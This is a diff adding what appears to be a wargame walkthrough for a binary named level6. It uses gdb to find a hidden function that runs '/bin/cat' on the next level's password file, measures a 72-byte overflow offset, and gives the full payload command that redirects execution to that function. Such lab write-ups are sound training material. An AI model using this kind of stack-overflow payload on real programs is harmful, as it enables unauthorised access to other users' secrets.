@@ -1,0 +1,30 @@
+# As usual let's start with objdump, info variables, info functions
+# We can see call of , n(), m(), main functions
+disas m
+#   	0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1
+#	0x08048475 <+13>:	call   0x8048360 <puts@plt>
+x/s 0x80485d1
+# 0x80485d1:	 "Nope"
+# m() func is what the program returns when we give him one arg
+disas n
+#    0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0
+#    0x08048461 <+13>:	call   0x8048370 <system@plt>
+# We can see a system call which may be interesting
+x/s 0x80485b0
+# 0x80485b0:	 "/bin/cat /home/user/level7/.pass"
+# Maybe with a buffer overflow or something we can try to make n() func to get called instead of m() func, let's try to see how many bytes it needs to segfault
+r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVXXXXYYYYZZZZ
+# 0x53535353 in ?? ()
+# Let's check which letter is 0x53
+chr(0x53)
+# S
+# And let's use struct to convert n() func address
+struct.pack("I", 0x08048454)
+# 'T\x84\x04\x08'
+# So we've the buffer overflow comes with the S char, at the 76 bytes, we also know that the address size is 4 bytes.
+# Let's try to give that as arg to our program
+./level6 $(echo -ne "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRT\x84\x04\x08")
+
+
+
+
